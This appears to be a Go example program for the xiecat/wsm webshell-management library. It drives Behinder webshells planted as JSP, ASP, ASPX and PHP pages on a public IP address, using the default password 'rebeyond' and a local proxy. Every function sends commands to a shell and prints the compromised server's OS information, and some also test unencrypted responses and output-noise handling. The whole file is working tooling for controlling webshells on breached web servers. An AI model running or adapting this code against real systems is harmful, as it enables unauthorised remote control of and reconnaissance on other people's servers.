package main

import (
	"fmt"
	"github.com/xiecat/wsm"
	"github.com/xiecat/wsm/lib/shell"
	"github.com/xiecat/wsm/lib/shell/behinder"
	"log"
)

func main() {
	log.SetFlags(log.Lshortfile)
	jspBasicInfo()
	aspBasicInfo()
	aspxBasicInfo()
	phpBasicInfo()

	unencryptedBody()
	obstacleBody()
}

// 输出结果中存在干扰字符
func obstacleBody() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://139.196.175.86:8080/bxindex.jsp",
			Password: "rebeyond",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	p := &behinder.PingParams{
		OnlyJavaParams: behinder.OnlyJavaParams{
			// 改变输出流
			ForcePrint: true,
			// 代表对结果不进行加密
			NotEncrypt: true,
		},
		Content: "",
	}
	// 使用 ping 来确定干扰字符的范围
	ping, err := bx.Ping(p)
	if err != nil {
		return
	}
	fmt.Println(ping)
	bi := &behinder.BasicInfoParams{
		OnlyJavaParams: behinder.OnlyJavaParams{
			ForcePrint: true,
			// 代表对结果不进行加密
			NotEncrypt: true,
		},
		WhatEver: "fklasdjflkasjfl",
	}
	b, err := bx.BasicInfo(bi)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(b.ToMap()["osInfo"])
}

func unencryptedBody() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://139.196.175.86:8080/bx.jsp",
			Password: "rebeyond",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	bi := &behinder.BasicInfoParams{
		OnlyJavaParams: behinder.OnlyJavaParams{
			ForcePrint: false,
			// 代表对结果不进行加密
			NotEncrypt: true,
		},
		WhatEver: "fklasdjflkasjfl",
	}
	b, err := bx.BasicInfo(bi)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(b.ToMap()["osInfo"])
}

func phpBasicInfo() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://139.196.175.86/bx.php",
			Password: "rebeyond",
			Script:   shell.PhpScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	b, err := bx.BasicInfo()
	if err != nil {
		log.Println(err)
	}
	fmt.Println(b.ToMap()["osInfo"])
}

func aspxBasicInfo() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://139.196.175.86:8081/bx.aspx",
			Password: "rebeyond",
			Script:   shell.CsharpScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	b, err := bx.BasicInfo()
	if err != nil {
		log.Println(err)
	}
	fmt.Println(b.ToMap()["osInfo"])
}

func aspBasicInfo() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://139.196.175.86:8081/bx.asp",
			Password: "rebeyond",
			Script:   shell.AspScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	b, err := bx.BasicInfo()
	if err != nil {
		log.Printf("%#+v\n", err)
	}
	fmt.Println(b.ToMap()["osInfo"])
}

func jspBasicInfo() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://139.196.175.86:8080/bx.jsp",
			Password: "rebeyond",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	b, err := bx.BasicInfo()
	if err != nil {
		log.Println(err)
	}
	fmt.Println(b.ToMap()["osInfo"])
}
